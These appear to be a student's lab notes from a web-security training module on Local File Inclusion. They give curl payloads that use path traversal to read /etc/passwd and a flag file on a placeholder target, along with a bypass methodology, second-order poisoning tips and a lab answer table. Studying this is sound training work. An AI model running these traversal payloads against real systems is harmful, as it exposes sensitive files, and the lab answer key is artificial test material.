# NOTE template — hands-on section (has commands)

## ID
<!-- Pick the next free number in the module's range. -->
<!-- TODO: assign correct ID from your module range -->

## Module
File Inclusion

## Kind
notes

## Title
Section 2 — Local File Inclusion (LFI)

## Description
Exploiting LFI vulnerabilities to read arbitrary local files via direct path, path traversal, prefix bypass, and second-order attack patterns.

## Tags
lfi, file-inclusion, path-traversal, php, web

## Commands
- curl -s "http://<TARGET>/index.php?language=../../../../etc/passwd"
- curl -s "http://<TARGET>/index.php?language=../../../../etc/passwd" | grep ^<LETTER>
- curl -s "http://<TARGET>/index.php?language=../../../../usr/share/flags/flag.txt"
- view-source:http://<TARGET>/index.php?language=../../../../etc/passwd

## What This Section Covers
LFI occurs when a web app includes a local file based on a user-controlled parameter without sanitization. An attacker can manipulate that parameter to read sensitive files like `/etc/passwd`. Path traversal (`../`) is the core technique used to escape the intended directory and reach arbitrary file paths.

## Methodology
1. Identify a parameter that controls which file/template is loaded (e.g. `?language=es.php`).
2. Test direct path: set the parameter to `/etc/passwd` — succeeds if the full path is passed directly to `include()`.
3. If blocked, test path traversal: prepend enough `../` sequences to reach root, e.g. `../../../../etc/passwd`.
4. If a filename prefix exists (e.g. `lang_`), prepend `/` to the payload: `/../../../etc/passwd`.
5. If an extension is appended (e.g. `.php`), use bypass techniques covered in later sections.
6. For second-order attacks: identify parameters stored in a DB (e.g. username) that are later used in file operations, and poison them with an LFI payload at registration time.

## Multi-step Workflow

```bash
# Step 1 — attempt absolute path (works if no prefix/suffix)
curl -s "http://<TARGET>/index.php?language=/etc/passwd"

# Step 2 — path traversal (works in most cases; use enough ../ to reach /)
curl -s "http://<TARGET>/index.php?language=../../../../etc/passwd"

# Step 3 — filter for specific users
curl -s "http://<TARGET>/index.php?language=../../../../etc/passwd" | grep ^b

# Step 4 — read a specific file
curl -s "http://<TARGET>/index.php?language=../../../../usr/share/flags/flag.txt"

# Alternative — browser source view
view-source:http://<TARGET>/index.php?language=../../../../etc/passwd
```

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Find a user starting with "b" | `barry` | `curl ... \| grep ^b` against `/etc/passwd` |
| Contents of `/usr/share/flags/flag.txt` | *(retrieve live)* | `curl -s ".../index.php?language=../../../../usr/share/flags/flag.txt"` |

## Key Takeaways
- Path traversal (`../../../../`) is the default go-to — it works whether or not a directory prefix exists in the `include()` call.
- Adding excessive `../` is safe: going above `/` keeps you at root, so you can prepend many more than needed without breaking the path.
- A prefix like `lang_` can be bypassed by starting the payload with `/`, making the prefix look like a non-existent directory.
- Extension appending (`.php`) requires separate bypass techniques (PHP wrappers, null bytes on older PHP versions).
- Second-order LFI is easy to miss — always check if user-supplied values get stored and later used in file operations.

## Gotchas
- If the include has an appended extension (e.g. `include($_GET['language'] . ".php")`), basic traversal returns a `.php` version of your target, which won't exist — use PHP wrappers instead.
- Prefix bypass with `/` may fail if the app enforces that the constructed path must exist.
- Never assume the minimum `../` count — calculate from the known web root depth (`/var/www/html/` = 3 levels) or just use 6–8 to be safe, then optimize for the report.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-inclusion]]  
← [[01-intro-to-file-inclusion]] | [[03-basic-bypasses]] →
<!-- AUTO-LINKS-END -->
